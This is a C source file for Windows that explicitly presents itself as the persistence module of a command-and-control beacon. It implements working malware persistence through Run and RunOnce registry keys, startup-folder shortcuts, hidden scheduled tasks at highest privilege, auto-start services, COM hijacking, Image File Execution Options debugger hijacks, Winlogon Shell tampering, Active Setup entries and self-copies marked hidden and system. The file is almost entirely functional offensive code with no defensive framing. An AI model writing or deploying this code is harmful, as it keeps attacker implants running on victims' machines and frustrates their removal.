/*
 * Persistence Agent - Auto-start mechanisms
 * C2 beacon persistence
 */

#include <windows.h>
#include <shlobj.h>

#pragma comment(lib, "shell32.lib")

// ============================================================================
// REGISTRY RUN KEYS
// ============================================================================

BOOL persist_hkcu(char* name, char* path)
{
    HKEY hK;
    if(RegOpenKeyExA(0x80000001,  // HKEY_CURRENT_USER
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, 2, &hK) != 0)  // KEY_SET_VALUE
        return 0;

    LSTATUS r = RegSetValueExA(hK, name, 0, 1, (BYTE*)path, lstrlenA(path) + 1);
    RegCloseKey(hK);
    return r == 0;
}

BOOL persist_hklm(char* name, char* path)
{
    HKEY hK;
    if(RegOpenKeyExA(0x80000002,  // HKEY_LOCAL_MACHINE
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, 2, &hK) != 0)
        return 0;

    LSTATUS r = RegSetValueExA(hK, name, 0, 1, (BYTE*)path, lstrlenA(path) + 1);
    RegCloseKey(hK);
    return r == 0;
}

BOOL persist_runonce(char* name, char* path)
{
    HKEY hK;
    if(RegOpenKeyExA(0x80000001,
        "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
        0, 2, &hK) != 0)
        return 0;

    LSTATUS r = RegSetValueExA(hK, name, 0, 1, (BYTE*)path, lstrlenA(path) + 1);
    RegCloseKey(hK);
    return r == 0;
}

BOOL persist_remove(DWORD root, char* name)
{
    HKEY hK;
    if(RegOpenKeyExA((HKEY)(ULONG_PTR)root,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, 2, &hK) != 0)
        return 0;

    LSTATUS r = RegDeleteValueA(hK, name);
    RegCloseKey(hK);
    return r == 0;
}

// ============================================================================
// STARTUP FOLDER
// ============================================================================

BOOL persist_startup(char* src, char* name)
{
    char startup[260];
    if(FAILED(SHGetFolderPathA(0, 7, 0, 0, startup)))  // CSIDL_STARTUP
        return 0;

    char lnk[260];
    wsprintfA(lnk, "%s\\%s.lnk", startup, name);

    CoInitialize(0);

    IShellLinkA* psl;
    if(FAILED(CoCreateInstance(&CLSID_ShellLink, 0, 1,
        &IID_IShellLinkA, (void**)&psl))) {
        CoUninitialize();
        return 0;
    }

    psl->lpVtbl->SetPath(psl, src);
    psl->lpVtbl->SetWorkingDirectory(psl, "");

    IPersistFile* ppf;
    HRESULT hr = psl->lpVtbl->QueryInterface(psl, &IID_IPersistFile, (void**)&ppf);
    if(SUCCEEDED(hr)) {
        WCHAR wpath[260];
        MultiByteToWideChar(0, 0, lnk, -1, wpath, 260);
        hr = ppf->lpVtbl->Save(ppf, wpath, 1);
        ppf->lpVtbl->Release(ppf);
    }

    psl->lpVtbl->Release(psl);
    CoUninitialize();
    return SUCCEEDED(hr);
}

// ============================================================================
// SCHEDULED TASK
// ============================================================================

BOOL persist_schtask(char* name, char* path)
{
    char cmd[1024];
    wsprintfA(cmd, "schtasks /create /tn \"%s\" /tr \"%s\" /sc onlogon /rl highest /f",
        name, path);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 1;
    si.wShowWindow = 0;

    if(!CreateProcessA(0, cmd, 0, 0, 0, 0x08000000, 0, 0, &si, &pi))
        return 0;

    WaitForSingleObject(pi.hProcess, 5000);

    DWORD code;
    GetExitCodeProcess(pi.hProcess, &code);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return code == 0;
}

BOOL persist_schtask_del(char* name)
{
    char cmd[512];
    wsprintfA(cmd, "schtasks /delete /tn \"%s\" /f", name);

    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = 1;
    si.wShowWindow = 0;

    if(!CreateProcessA(0, cmd, 0, 0, 0, 0x08000000, 0, 0, &si, &pi))
        return 0;

    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 1;
}

// ============================================================================
// WINDOWS SERVICE
// ============================================================================

BOOL persist_service(char* svc, char* disp, char* path)
{
    SC_HANDLE hM = OpenSCManagerA(0, 0, 2);  // SC_MANAGER_CREATE_SERVICE
    if(!hM) return 0;

    SC_HANDLE hS = CreateServiceA(hM, svc, disp,
        0xF01FF,  // SERVICE_ALL_ACCESS
        0x10,     // SERVICE_WIN32_OWN_PROCESS
        2,        // SERVICE_AUTO_START
        1,        // SERVICE_ERROR_NORMAL
        path, 0, 0, 0, 0, 0);

    if(!hS) {
        CloseServiceHandle(hM);
        return 0;
    }

    StartServiceA(hS, 0, 0);

    CloseServiceHandle(hS);
    CloseServiceHandle(hM);
    return 1;
}

BOOL persist_service_del(char* svc)
{
    SC_HANDLE hM = OpenSCManagerA(0, 0, 0xF003F);
    if(!hM) return 0;

    SC_HANDLE hS = OpenServiceA(hM, svc, 0xF01FF);
    if(!hS) {
        CloseServiceHandle(hM);
        return 0;
    }

    SERVICE_STATUS st;
    ControlService(hS, 1, &st);  // SERVICE_CONTROL_STOP
    Sleep(1000);

    BOOL r = DeleteService(hS);

    CloseServiceHandle(hS);
    CloseServiceHandle(hM);
    return r;
}

// ============================================================================
// COM HIJACK
// ============================================================================

BOOL persist_com(char* clsid, char* dll)
{
    char key[256];
    wsprintfA(key, "Software\\Classes\\CLSID\\%s\\InprocServer32", clsid);

    HKEY hK;
    if(RegCreateKeyExA(0x80000001, key, 0, 0, 0, 2, 0, &hK, 0) != 0)
        return 0;

    RegSetValueExA(hK, 0, 0, 1, (BYTE*)dll, lstrlenA(dll) + 1);
    RegSetValueExA(hK, "ThreadingModel", 0, 1, (BYTE*)"Both", 5);

    RegCloseKey(hK);
    return 1;
}

// ============================================================================
// IFEO - Image File Execution Options
// ============================================================================

BOOL persist_ifeo(char* target, char* debugger)
{
    char key[256];
    wsprintfA(key,
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\%s",
        target);

    HKEY hK;
    if(RegCreateKeyExA(0x80000002, key, 0, 0, 0, 2, 0, &hK, 0) != 0)
        return 0;

    RegSetValueExA(hK, "Debugger", 0, 1, (BYTE*)debugger, lstrlenA(debugger) + 1);
    RegCloseKey(hK);
    return 1;
}

// ============================================================================
// WINLOGON
// ============================================================================

BOOL persist_winlogon(char* path)
{
    HKEY hK;
    if(RegOpenKeyExA(0x80000002,
        "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        0, 2, &hK) != 0)
        return 0;

    char val[512];
    wsprintfA(val, "explorer.exe,%s", path);

    RegSetValueExA(hK, "Shell", 0, 1, (BYTE*)val, lstrlenA(val) + 1);
    RegCloseKey(hK);
    return 1;
}

// ============================================================================
// ACTIVE SETUP
// ============================================================================

BOOL persist_activesetup(char* name, char* path)
{
    char key[256];
    wsprintfA(key, "Software\\Microsoft\\Active Setup\\Installed Components\\%s", name);

    HKEY hK;
    if(RegCreateKeyExA(0x80000002, key, 0, 0, 0, 2, 0, &hK, 0) != 0)
        return 0;

    RegSetValueExA(hK, "StubPath", 0, 1, (BYTE*)path, lstrlenA(path) + 1);
    RegCloseKey(hK);
    return 1;
}

// ============================================================================
// COPY TO HIDDEN LOCATION
// ============================================================================

BOOL persist_copy(char* dst)
{
    char src[260];
    GetModuleFileNameA(0, src, 260);

    if(!CopyFileA(src, dst, 0))
        return 0;

    SetFileAttributesA(dst, 2 | 4);  // HIDDEN | SYSTEM
    return 1;
}

// ============================================================================
// CHECK CURRENT PERSISTENCE
// ============================================================================

BOOL persist_check_reg(char* name)
{
    HKEY hK;
    if(RegOpenKeyExA(0x80000001,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, 1, &hK) != 0)  // KEY_QUERY_VALUE
        return 0;

    char val[260];
    DWORD sz = sizeof(val);
    LSTATUS r = RegQueryValueExA(hK, name, 0, 0, (BYTE*)val, &sz);
    RegCloseKey(hK);
    return r == 0;
}

// ============================================================================
// EOF
// ============================================================================
